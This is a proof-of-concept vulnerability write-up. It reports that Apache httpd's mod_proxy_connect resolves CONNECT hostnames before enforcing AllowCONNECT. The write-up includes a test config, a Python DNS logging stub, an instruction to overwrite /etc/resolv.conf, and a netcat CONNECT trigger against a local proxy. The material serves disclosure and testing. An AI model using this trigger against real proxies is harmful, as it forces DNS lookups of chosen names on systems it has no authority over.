# PoC 148 — CONNECT Port Authorization Occurs After DNS Resolution

`mod_proxy_connect` resolves the CONNECT target hostname before enforcing
`AllowCONNECT`. Disallowed-port CONNECTs still cause DNS lookups for
attacker-chosen names.

## Setup

Minimum `httpd.conf` (forward proxy on port 8080, restrictive
`AllowCONNECT`):

```apache
ServerRoot "/tmp/httpd-poc-148"
PidFile    "/tmp/httpd-poc-148/httpd.pid"
ErrorLog   "/tmp/httpd-poc-148/error.log"
LogLevel   proxy:debug

Listen 127.0.0.1:8080

LoadModule mpm_event_module     modules/mod_mpm_event.so
LoadModule authz_core_module    modules/mod_authz_core.so
LoadModule proxy_module         modules/mod_proxy.so
LoadModule proxy_connect_module modules/mod_proxy_connect.so

ProxyRequests On
AllowCONNECT 443
```

Point the resolver at a logging stub. The simplest portable variant uses a
local stub resolver bound to 127.0.0.53:53. On Linux, drop the contents of
`/etc/resolv.conf` to:

```
nameserver 127.0.0.53
```

Run a logging UDP DNS stub:

```bash
python3 - <<'PY' &
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("127.0.0.53", 53))
while True:
    data, addr = s.recvfrom(4096)
    name = []
    i = 12
    while data[i]:
        n = data[i]; i += 1
        name.append(data[i:i+n].decode()); i += n
    print("DNS query for", ".".join(name), "from", addr, flush=True)
PY
```

Start httpd:

```bash
sudo /usr/sbin/httpd -f /tmp/httpd-poc-148/httpd.conf -k start
```

## Trigger

Issue a CONNECT for a non-allowed port (1234) with an attacker-chosen
hostname that would otherwise never be resolved by this server:

```bash
printf 'CONNECT canary-148.example.invalid:1234 HTTP/1.1\r\nHost: canary-148.example.invalid:1234\r\n\r\n' \
  | nc -w 2 127.0.0.1 8080
```

## Observed effect

* The DNS stub prints `DNS query for canary-148.example.invalid` before
  the proxy responds.
* httpd then returns `403 Forbidden` with body
  `Connect to remote machine blocked`.
* `error.log` contains the `connecting ... to canary-148.example.invalid:1234`
  debug line and the AH00961 / AH01019 markers.

The DNS request was made even though the port policy ultimately rejects
the request, confirming the ordering bug at
`modules/proxy/mod_proxy_connect.c:205`.
